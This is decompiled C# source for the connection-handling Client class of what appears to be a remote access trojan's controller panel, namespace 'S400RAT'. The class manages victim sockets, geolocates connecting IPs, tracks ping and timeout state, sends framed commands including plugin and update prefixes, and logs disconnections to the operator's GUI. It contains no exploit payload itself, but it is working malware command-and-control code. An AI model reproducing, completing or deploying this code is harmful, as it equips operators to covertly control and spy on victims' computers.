using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace S400RAT;

public class Client
{
	public byte[] b;

	public bool bool_0;

	public bool bool_1;

	public TcpClient Client;

	public bool CN;

	public string CName;

	public string Co;

	public Bitmap COI;

	public string USS;

	public Bitmap MM;

	public string DC;

	public Bitmap DSC;

	public string Folder;

	public int int_0;

	public bool Isend;

	public bool isPL;

	public bool IsPNGED;

	public DataGridViewRow L;

	public string lastAC;

	public DateTime lastPC;

	public DateTime lastPing;

	public long Length;

	public MemoryStream M;

	public long msec;

	public bool NoPing;

	public Client osk;

	public List<string> plg;

	public int SendingProgress;

	public SK SK;

	public string string_0;

	public string string_1;

	public System.Threading.Timer t;

	public Client(TcpClient c, SK sk)
	{
		bool_0 = false;
		CN = true;
		CName = "Unknown";
		Co = "--";
		USS = "--";
		DC = "d";
		int_0 = 5;
		Isend = false;
		isPL = false;
		IsPNGED = false;
		lastAC = string.Empty;
		lastPC = default(DateTime);
		lastPing = DateTime.Now;
		msec = 0L;
		NoPing = false;
		plg = new List<string>();
		string_0 = string.Empty;
		t = new System.Threading.Timer(delegate
		{
			method_2();
		}, null, 0, 3000);
		M = new MemoryStream();
		b = new byte[1];
		string_1 = string.Empty;
		Length = -1L;
		osk = null;
		bool_1 = false;
		Client = c;
		SK = sk;
		try
		{
			GClass4 gClass = Class7.gclass3_0.method_4(c.Client.RemoteEndPoint.ToString().Split(':')[0]);
			Co = gClass.method_0();
			CName = gClass.method_1();
			if ((Operators.CompareString(Co, "A1", TextCompare: false) == 0) | (Operators.CompareString(Co, "A2", TextCompare: false) == 0))
			{
				Co = "--";
			}
			if (!((Form1)Class7.object_1).vmethod_0().Images.ContainsKey(Co + ".png"))
			{
				Co = "--";
			}
			COI = (Bitmap)((Form1)Class7.object_1).vmethod_0().Images[Co + ".png"];
			DSC = (Bitmap)((Form1)Class7.object_1).vmethod_16().Images[DC + ".png"];
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		Client.Client.BeginReceive(b, 0, b.Length, SocketFlags.None, b_read, null);
	}

	[CompilerGenerated]
	public void method_0(object object_0)
	{
		SEND_((byte[])object_0);
	}

	[CompilerGenerated]
	public void method_1(object object_0)
	{
		method_2();
	}

	public void b_read(IAsyncResult ar)
	{
		if (!(!CN | bool_1))
		{
			try
			{
				int num = 0;
				try
				{
					num = Client.Client.EndReceive(ar);
				}
				catch (SocketException ex)
				{
					ProjectData.SetProjectError(ex);
					SocketException ex2 = ex;
					ProjectData.SetProjectError(ex2);
					SocketException ex3 = ex2;
					string_1 = ex3.SocketErrorCode.ToString();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
					goto end_IL_0015;
				}
				if (num > 0)
				{
					Class7.long_1 += num;
					if (Length != -1L)
					{
						M.Write(b, 0, num);
						if (M.Length == Length)
						{
							Length = -1L;
							GClass12 gClass = new GClass12(this, M.ToArray());
							List<GClass12> rEQ = SK.REQ;
							lock (rEQ)
							{
								SK.REQ.Add(gClass);
							}
							while (!gClass.bool_0)
							{
								Thread.Sleep(1);
							}
							M.Dispose();
							M = new MemoryStream();
							b = new byte[1];
						}
						else
						{
							b = new byte[(int)(Length - M.Length - 1L) + 1 - 1 + 1];
						}
						goto IL_021f;
					}
					if (b[0] != 0)
					{
						M.WriteByte(b[0]);
						goto IL_021f;
					}
					byte[] byte_ = M.ToArray();
					Length = Conversions.ToLong(Class6.smethod_4(ref byte_));
					M.Dispose();
					M = new MemoryStream();
					if (Length != 0L)
					{
						b = new byte[(int)(Length - 1L) + 1 - 1 + 1];
						goto IL_021f;
					}
					Length = -1L;
					if (!((L == null) & !isPL))
					{
						int num2 = (int)Math.Round((DateAndTime.Now.Subtract(lastPing).TotalMilliseconds - 10.0) / 1.5);
						if (num2 < 0)
						{
							num2 = 0;
						}
						if (num2 > 999)
						{
							num2 = 999;
						}
						lastPing = DateAndTime.Now;
						IsPNGED = false;
						string text = "P" + Class7.string_1 + num2.ToString("000");
						GClass12 gClass2 = new GClass12(this, Class6.smethod_3(ref text));
						List<GClass12> rEQ2 = SK.REQ;
						lock (rEQ2)
						{
							SK.REQ.Add(gClass2);
						}
						while (!gClass2.bool_0)
						{
							Thread.Sleep(1);
						}
						goto IL_036e;
					}
					string_1 = "LTimeOut";
				}
				goto end_IL_0015;
				IL_021f:
				Thread.Sleep(1);
				goto IL_036e;
				end_IL_0015:;
			}
			catch (Exception ex4)
			{
				ProjectData.SetProjectError(ex4);
				Exception projectError = ex4;
				ProjectData.SetProjectError(projectError);
				string_1 = "RError";
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		goto IL_03e4;
		IL_03e4:
		CN = false;
		return;
		IL_036e:
		if (CN)
		{
			try
			{
				Client.Client.BeginReceive(b, 0, b.Length, SocketFlags.None, b_read, null);
				return;
			}
			catch (SocketException ex5)
			{
				ProjectData.SetProjectError(ex5);
				SocketException ex6 = ex5;
				ProjectData.SetProjectError(ex6);
				SocketException ex7 = ex6;
				string_1 = ex7.SocketErrorCode.ToString();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			goto IL_03e4;
		}
	}

	public void Close()
	{
		if (bool_1)
		{
			return;
		}
		bool_1 = true;
		CN = false;
		try
		{
			t.Dispose();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			M.Dispose();
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError2 = ex2;
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Client.Connected)
			{
				Client.GetStream().Close();
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception projectError3 = ex3;
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Client.Client.Close();
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception projectError4 = ex4;
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		Isend = false;
		plg.Clear();
		if (Operators.CompareString(string_1, string.Empty, TextCompare: false) == 0)
		{
			string_1 = "Disconnected";
		}
		if (!((L != null) & !isPL))
		{
			if (Class7.class8_0.bool_2)
			{
				string expression = ip();
				string[] array = Strings.Split(expression, ":");
				((Form1)Class7.object_1).Pp1.WRT(Color.Red, " |> End");
				((Form1)Class7.object_1).Pp1.WRT(" |---->", DSC, Color.Red, Class6.smethod_6(), COI, Color.Orange, "IP - " + array[0], "Disconnected");
				((Form1)Class7.object_1).Pp1.WRT(" |");
				((Form1)Class7.object_1).Pp1.WRT(Color.Red, "[-] Timeout");
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "";
				listViewItem.SubItems.Add("win");
				listViewItem.SubItems.Add("");
				listViewItem.SubItems.Add("Disconnected");
				listViewItem.ImageIndex = 10;
				Class2.XTBfo6WOm.Form1.Logisx.Items.Add(listViewItem);
			}
		}
		else
		{
			string expression2 = ip();
			string[] array2 = Strings.Split(expression2, ":");
			((Form1)Class7.object_1).Pp1.WRT(Color.Red, " |> End");
			((Form1)Class7.object_1).Pp1.WRT(" |---->", DSC, Color.Red, Class6.smethod_6(), COI, Color.Orange, "IP - " + array2[0], "Disconnected");
			((Form1)Class7.object_1).Pp1.WRT(" |");
			((Form1)Class7.object_1).Pp1.WRT(Color.Red, "[-] Disconnected");
			ListViewItem listViewItem2 = new ListViewItem();
			listViewItem2.Text = "";
			listViewItem2.SubItems.Add("win");
			listViewItem2.SubItems.Add("");
			listViewItem2.SubItems.Add("Disconnected");
			listViewItem2.ImageIndex = 10;
			Class2.XTBfo6WOm.Form1.Logisx.Items.Add(listViewItem2);
		}
		Collection online = Class7.sk_0.Online;
		lock (online)
		{
			if (Class7.sk_0.Online.Contains(ip()))
			{
				Class7.sk_0.Online.Remove(ip());
			}
		}
		if (L != null)
		{
			((Form1)Class7.object_1).L1.method_9(L);
		}
		L = null;
	}

	public string ip()
	{
		if (string_0.Length <= 0)
		{
			try
			{
				string_0 = Client.Client.RemoteEndPoint.ToString();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				string_0 = GetHashCode().ToString();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		return string_0;
	}

	public void method_2()
	{
		if (bool_0 | bool_1)
		{
			return;
		}
		lock (this)
		{
			bool_0 = true;
			if (!CN)
			{
				Close();
				return;
			}
			double totalSeconds = DateAndTime.Now.Subtract(lastPing).TotalSeconds;
			if (!isPL && L == null && totalSeconds > 8.0)
			{
				string_1 = "LTimeOut";
				Close();
				return;
			}
			if (!NoPing)
			{
				if (IsPNGED)
				{
					if ((((SendingProgress == 0) & !isPL) && totalSeconds > 6.0) & (L != null))
					{
						try
						{
							if (L.Cells.Count > Class7.int_11)
							{
								L.Cells[Class7.int_11].Value = "TimeOut";
								L.Cells[Class7.int_11].Style.BackColor = Color.Red;
								SEND_(new byte[1025]);
								if (!CN)
								{
									Close();
									return;
								}
							}
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception projectError = ex;
							ProjectData.SetProjectError(projectError);
							Close();
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				else if (totalSeconds >= (double)int_0)
				{
					int_0 = 15;
					string empty = string.Empty;
					SEND_(Class6.smethod_3(ref empty));
					IsPNGED = true;
					lastPing = DateAndTime.Now;
					if (!CN)
					{
						Close();
						return;
					}
				}
			}
			bool_0 = false;
		}
	}

	public int rp()
	{
		if (Length == -1L)
		{
			return 0;
		}
		int result;
		try
		{
			result = Class6.smethod_1((int)M.Length, (int)Length);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			result = 0;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public bool Send(string S)
	{
		Send(Class6.smethod_3(ref S));
		return false;
	}

	public void Send(byte[] b)
	{
		if (CN)
		{
			ThreadPool.QueueUserWorkItem(delegate(object object_0)
			{
				SEND_((byte[])object_0);
			}, b);
		}
	}

	public void SEND_(byte[] b)
	{
		try
		{
			lock (this)
			{
				SendingProgress = 0;
				string[] array = null;
				if (b.Length > 3)
				{
					array = new string[1] { Conversions.ToString(Strings.ChrW(b[0])) + Conversions.ToString(Strings.ChrW(b[1])) + Conversions.ToString(Strings.ChrW(b[2])) };
					if (!((Operators.CompareString(array[0], "inv", TextCompare: false) == 0) | (Operators.CompareString(array[0], "rn" + Conversions.ToString(Strings.ChrW(b[2])), TextCompare: false) == 0) | (Operators.CompareString(array[0], "up" + Conversions.ToString(Strings.ChrW(b[2])), TextCompare: false) == 0) | (Operators.CompareString(array[0], "ret", TextCompare: false) == 0) | (Operators.CompareString(array[0], "PLG", TextCompare: false) == 0)))
					{
						array = null;
					}
				}
				int num = 0;
				MemoryStream memoryStream = new MemoryStream();
				string text = b.Length + "\0";
				byte[] array2 = Class6.smethod_3(ref text);
				memoryStream.Write(array2, 0, array2.Length);
				memoryStream.Write(b, 0, b.Length);
				int num2 = 1;
				long length = memoryStream.Length;
				memoryStream.Position = 0L;
				while (true)
				{
					if (num2 >= 1)
					{
						byte[] array3 = new byte[10241];
						num2 = memoryStream.Read(array3, 0, array3.Length);
						Client.Client.Poll(-1, SelectMode.SelectWrite);
						try
						{
							Client.Client.Send(array3, 0, num2, SocketFlags.None);
						}
						catch (SocketException ex)
						{
							ProjectData.SetProjectError(ex);
							SocketException ex2 = ex;
							ProjectData.SetProjectError(ex2);
							SocketException ex3 = ex2;
							SendingProgress = 0;
							string_1 = ex3.SocketErrorCode.ToString();
							CN = false;
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							break;
						}
						Class7.long_0 += num2;
						num += num2;
						if (!(!CN | bool_1))
						{
							if (array != null)
							{
								SendingProgress = Class6.smethod_1(num, (int)length);
							}
							continue;
						}
						break;
					}
					memoryStream.Dispose();
					SendingProgress = 0;
					break;
				}
			}
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception projectError = ex4;
			ProjectData.SetProjectError(projectError);
			SendingProgress = 0;
			string_1 = "SError";
			CN = false;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
	}
}
